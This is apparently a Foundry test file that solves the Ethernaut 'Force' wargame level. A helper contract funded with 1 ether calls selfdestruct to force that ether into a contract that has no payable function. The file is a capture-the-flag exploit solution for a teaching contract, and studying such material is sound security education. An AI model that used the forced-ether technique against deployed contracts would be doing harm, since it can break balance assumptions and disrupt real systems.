// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Force/Force.sol";
import "../src/Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut private _ethernaut;
    ForceFactory private _forceFactory;
    Force private _force;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_forceFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_forceFactory);
        _force = Force(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_force)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _forceFactory = new ForceFactory();
    }

    function testForceHack() public testWrapper {
        // console2.log("_force before:", address(_force).balance);
        SelfdestructContract selfdestructContract = new SelfdestructContract{
            value: 1 ether
        }();
        selfdestructContract.selfdestuctFunction(payable(address(_force)));
        // console2.log("_force after:", address(_force).balance);
    }
}

contract SelfdestructContract {
    constructor() public payable {}

    function selfdestuctFunction(address payable to) public {
        selfdestruct(to);
    }
}
